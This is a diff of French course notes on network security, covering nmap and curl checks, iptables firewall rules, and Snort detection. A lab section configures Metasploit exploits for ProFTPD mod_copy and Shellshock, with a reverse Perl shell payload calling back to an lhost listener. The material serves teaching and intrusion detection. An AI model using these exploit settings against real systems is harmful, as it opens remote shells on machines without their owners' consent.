@@ -6215,22 +6215,29 @@ end</code></pre>
                     <h4>Services disponibles :</h4>
                     <img src="../images/acces_machine_non_securisee_1.PNG" alt="">
 <pre><code>sudo nmap 172.28.128.17</code></pre>
+                    <p>En résumé, cette commande scanne les ports ouverts de la machine cible.</p>
                     <h4>web-servers accessibles de l'extérieur :</h4>
                     <img src="../images/acces_machine_non_securisee_2.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
 <pre><code>curl 172.28.128.17</code></pre>
+                    <p>En résumé, cette commande envoie une requête HTTP au serveur sur le port 80.</p>
 <pre><code>curl 172.28.128.17:8081</code></pre>
+                    <p>En résumé, cette commande envoie une requête HTTP sur le 8081.</p>
                     <h4>web-servers accessibles de l'intérieur :</h4>
                     <img src="../images/acces_machine_non_securisee_3.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
 <pre><code>curl localhost</code></pre>
+                    <p>En résumé, cette commande teste le serveur web en local (port 80).</p>
 <pre><code>cd /etc/nginx/conf.d</code></pre>
+                    <p>En résumé, cette commande accède au dossier de configuration des sites Nginx.</p>
 <pre><code>curl localhost:8081</code></pre>
+                    <p>En résumé, cette commande teste le serveur web local sur le port 8081.</p>
                     <h3>Iptables - accès à logique de filtrage interne au noyau :</h3>
                     <h4>Commandes :</h4>
                     <p><a href="https://www.linode.com/docs/guides/control-network-traffic-with-iptables/#basic-iptables-rulesets-for-ipv4-and-ipv6" target="_blank">https://www.linode.com/docs/guides/control-network-traffic-with-iptables/#basic-iptables-rulesets-for-ipv4-and-ipv6</a></p>
                     <img src="../images/iptables_acces_logique_filtrage_interne_noyau_1.PNG" alt="">
 <pre><code>cat v4</code></pre>
+                    <p>En résumé, cette commande affiche le contenu du fichier de règles iptables.</p>
                     <p>Voici le contenu du fichier `<span class="em">v4</span>` :</p>
 <pre><code>*filter
 
@@ -6270,26 +6277,31 @@ end</code></pre>
 COMMIT</code></pre>
                     <p>La ligne <span class="em">*filter</span> dit qu'on travaille dans la table <span class="em">filter</span> (la plus classique) qui, elle, sert à <span class="em">autoriser/bloquer le trafic</span>.</p>
                     <p>La ligne <span class="em">-A INPUT -i lo -j ACCEPT</span> indique qu'on autorise tout le trafic venant de <span class="em">localhost (lo)</span>.</p>
-                    <p>La ligne <span class="em">-A INPUT ! -i lo -s 127.0.0.0/8 -j REJECT</span> permet de bloquer toute tentative d'usurpation. C'est-à-dire, si une IP <span class="em">127.X.X.X</span> arrive <span class="em">pas via lo</span> = spoofing &#8594; rejeté.</p>
+                    <p>La ligne <span class="em">-A INPUT ! -i lo -s 127.0.0.0/8 -j REJECT</span> permet de bloquer toute tentative d'usurpation. C'est-à-dire, si une IP <span class="em">127.X.X.X</span> n'arrive <span class="em">pas via lo</span> = spoofing &#8594; rejeté.</p>
                     <p>La ligne <span class="em">-A INPUT -p icmp -m state --state NEW --icmp-type 8 -j ACCEPT</span> autorise les <span class="em">pings entrants</span> (<span class="em">icmp-type 8</span> = echo request).</p>
                     <p>La ligne <span class="em">-A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT</span> dit qu'on autorise les connexions SSH (port 22).</p>
-                    <p>Les lignes <span class="em">-A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT</span> et <span class="em">-A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT</span> autorise respectivement HTTP (80) et HTTPS (443). Donc, ton serveur web est accessible.</p>
+                    <p>Les lignes <span class="em">-A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT</span> et <span class="em">-A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT</span> autorisent respectivement HTTP (80) et HTTPS (443). Donc, ton serveur web est accessible.</p>
                     <p>La ligne <span class="em">-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span> permet d'autoriser les réponses à des connexions déjà ouvertes et les connexions liées. Super important sinon rien ne fonctionne correctement.</p>
-                    <p>La ligne <span class="em">-A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables_INPUT_denied: " --log-level 7</span> indique qu'on log les paquets refusés (max 5/min). C'est util pour le débogage.</p>
+                    <p>La ligne <span class="em">-A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables_INPUT_denied: " --log-level 7</span> indique qu'on log les paquets refusés (max 5/min). C'est utile pour le débogage.</p>
                     <p>La ligne <span class="em">-A INPUT -j REJECT</span> dit que tout ce qui n'est pas autorisé est rejeté. Politique : <span class="em">deny by default</span>.</p>
                     <p>La ligne <span class="em">-A FORWARD -m limit --limit 5/min -j LOG --log-prefix "iptables_FORWARD_denied: " --log-level 7</span> permet de logger les paquets en transit refusés.</p>
                     <p>La ligne <span class="em">-A FORWARD -j REJECT</span> bloque tout routage. Donc, la machine ne sert pas de routeur.</p>
                     <p>La ligne <span class="em">COMMIT</span> dit qu'on applique toutes les règles.</p>
                    <h4>Configuration du firewall :</h4>
+                   <p>Changement des règles firewall réservé à l'admin &#8594; SUDO réseau donc.</p>
                    <img src="../images/iptables_acces_logique_filtrage_interne_noyau_2.PNG" alt=""> 
+                   <p>On est au niveau du noyau. fw est une interface créée pour simplifier la configuration sur le noyau.</p>
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
 <pre><code>sudo iptables-restore &lt; v4</code></pre>
-                    <p>En résumé, le fichier `<span class="em">v4</span>` est un fichier de règles iptables. Il configure le pare-feu Linux (table <span class="em">filter</span>).</p>
+                    <p>En résumé, cette commande charge et applique les règles iptables depuis le fichier v4.</p>
+                    <p>Le fichier `<span class="em">v4</span>` est un fichier de règles iptables. Il configure le pare-feu Linux (table <span class="em">filter</span>).</p>
 <pre><code>sudo iptables -vL --line-numbers</code></pre>
+                    <p>En résumé, cette commande affiche les règles du firewall avec détails et numéros de ligne.</p>
                     <h3>Accès à une machine sécurisée :</h3>
                     <h4>Services disponibles :</h4>
                     <img src="../images/acces_machine_securisee_1.PNG" alt="">
 <pre><code>sudo nmap 172.28.128.17</code></pre>
+                    <p>Mieux de le faire avec sudo car on a plus d'infos (même parfois intrusives).</p>
                     <h4>web-servers accessibles de l'extérieur :</h4>
                     <img src="../images/acces_machine_securisee_2.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
@@ -6305,12 +6317,15 @@ COMMIT</code></pre>
                     <img src="../images/notion_gestion_etat_connection.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
 <pre><code>curl web-server.gac.xpertsys.be:8081</code></pre>
+                    <p>En résumé, cette commande teste l'accès HTTP à un serveur externe sur le port 8081.</p>
 <pre><code>ssh XXX7@XX.XX.XX.XX</code></pre>
+                    <p>En résumé, cette commande se connecte à une machine distante via SSH.</p>
                     <h3>Rajout d'une règle pour serveur 8081 :</h3>
                     <h4>Configuration :</h4>
                     <img src="../images/rajout_regle_serveur_8081.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
 <pre><code>sudo iptables -I INPUT 7 -p tcp --dport 8081 -m state --state NEW -j ACCEPT</code></pre>
+                    <p>En résumé, cette commande autorise les nouvelles connexions TCP sur le port 8081 (ajoutée en position 7).</p>
 <pre><code>sudo iptables -vL --line-numbers</code></pre>
                     <h3>Accès à une machine sécurisée :</h3>
                     <h4>Services disponibles :</h4>
@@ -6420,10 +6435,14 @@ sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none
                     <img src="../images/proFTP_exploit_1.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
 <pre><code>use exploit/unix/ftp/proftp_modcopy_exec</code></pre>
+                    <p>Ce que je vais exploiter.</p>
 <pre><code>set payload cmd/unix/reverse_per1</code></pre>
 <pre><code>set -g rhosts 172.28.128.3</code></pre>
+                    <p>Je vais attaquer le .3.</p>
 <pre><code>set -g lhost 172.28.128.1</code></pre>
+                    <p>On contacte cette adresse.</p>
 <pre><code>set sitepath /var/www/html</code></pre>
+                    <p>On met notre page malicieuse ici.</p>
                     <h4>Résumé configuration Metasploit Framework :</h4>
                     <img src="../images/proFTP_exploit_2.PNG" alt="">
 <pre><code>options</code></pre>
@@ -6442,8 +6461,10 @@ sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none
 <pre><code>info</code></pre>
                     <h4>Payload :</h4>
                     <p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/reverse_perl.rb" target="_blank">https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/reverse_perl.rb</a></p>
+                    <p>On peut les créer avec l'open source VENIN. On va le faire prochainement.</p>
                     <img src="../images/proFTP_exploit_7.PNG" alt="">
                     <h3>Shellshock (bug présent depuis 1989 (!)) :</h3>
+                    <p>C'est resté 19 ans non détecté !</p>
                     <h4>Metasploit Framework :</h4>
                     <img src="../images/shellshock_1.PNG" alt="">
 <pre><code>options</code></pre>
@@ -6451,11 +6472,13 @@ sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none
                     <h4>Exploitation :</h4>
                     <img src="../images/shellshock_3.PNG" alt="">
 <pre><code>run</code></pre>
+                    <p>En faisant Shell (une sorte de petit payload qui appelle un plus gros payload plus sophistiqué), je peux avoir plein de commandes de disponible pour faire ce que je veux sur la machine attaquée.</p>
                     <h4>Détection :</h4>
                     <img src="../images/shellshock_4.PNG" alt="">
                     <img src="../images/shellshock_5.PNG" alt="">
                     <p><a href="https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf" target="_blank">https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf</a></p>
                     <p><a href="https://www.infosecarticles.com/exploiting-shellshock-vulnerability/" target="_blank">https://www.infosecarticles.com/exploiting-shellshock-vulnerability/</a></p>
+                    <p>La manière de les parser peut être une ouverture de vulnérabilité.</p>
                     <h4>Exploitation détaillée :</h4>
                     <img src="../images/shellshock_6.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
@@ -6479,6 +6502,7 @@ sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none
 <pre><code>run</code></pre>
                     <h4>Détection :</h4>
                     <p>(Néant)</p>
+                    <p>On a vu les faux positifs et là on va voir les positifs mais jamais détecté ou très tard (Shell ou Drupal).</p>
                 </article>
                 <article>
                     <h2 id="detection_prevention_intrusion_forces_faiblesses">Détection/prévention d'intrusion : Forces et faiblesses :</h2>
@@ -6494,10 +6518,10 @@ sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none
                                     <p>Inspection possible du trafic...</p>
                                 </li>
                                 <li>
-                                    <p>... arrêt possible aussi.</p>
+                                    <p>... arrêt possible aussi (prévention).</p>
                                 </li>
                                 <li>
-                                    <p>Priorités, donc optimisation du travail.</p>
+                                    <p>Priorités dans les règles, donc optimisation du travail.</p>
                                 </li>
                                 <li>
                                     <p>Aide dans certains contextes régulatoires (logs).</p>
@@ -6523,7 +6547,7 @@ sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none
                                     <p>Faux sens de sécurité si utilisé seul.</p>
                                 </li>
                                 <li>
-                                    <p>Consommation de resources machine.</p>
+                                    <p>Consommation de resources machine (il faut configurer la RAM etc pour ça).</p>
                                 </li>
                                 <li>
                                     <p>Saturation possible du personnel de sécurité.</p>
